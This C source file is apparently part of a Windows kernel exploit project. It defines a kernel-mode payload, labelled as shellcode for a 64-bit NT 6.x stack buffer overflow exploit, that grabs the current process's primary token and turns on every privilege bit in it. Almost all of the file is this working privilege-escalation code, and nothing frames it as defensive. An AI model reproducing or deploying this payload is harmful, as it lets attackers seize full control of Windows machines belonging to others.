#include <windows.h>
#include <winioctl.h>
#include <stdio.h>
#include <tchar.h>
#include <Sddl.h>
#include "KernelArch.h"
#include "KernelExploit.h"

typedef struct _SEP_TOKEN_PRIVILEGES
{
     UINT64 Present;
     UINT64 Enabled;
     UINT64 EnabledByDefault;
} SEP_TOKEN_PRIVILEGES, *PSEP_TOKEN_PRIVILEGES;

#define GETOFFSET(token, offset) ( (PVOID) ((PCHAR)token + offset) )

/* 64-bit NT 6.x shellcode used within the stack buffer overflow exploit */
VOID ShellcodePrivilegesAdd(VOID)
{
  PACCESS_TOKEN tok; 
  PEPROCESS p=NULL;
  PSEP_TOKEN_PRIVILEGES pTokPrivs;
  p = PsGetCurrentProcess();
  if(p)
  {
    tok = PsReferencePrimaryToken(p);
    pTokPrivs = GETOFFSET(tok, TargetHost->Values.PrivListOffset);
    pTokPrivs->Present = pTokPrivs->Enabled = pTokPrivs->EnabledByDefault = 0xFFFFFFFFFFFFFFFFULL;
    PsDereferencePrimaryToken(tok);
  }
  return;
}
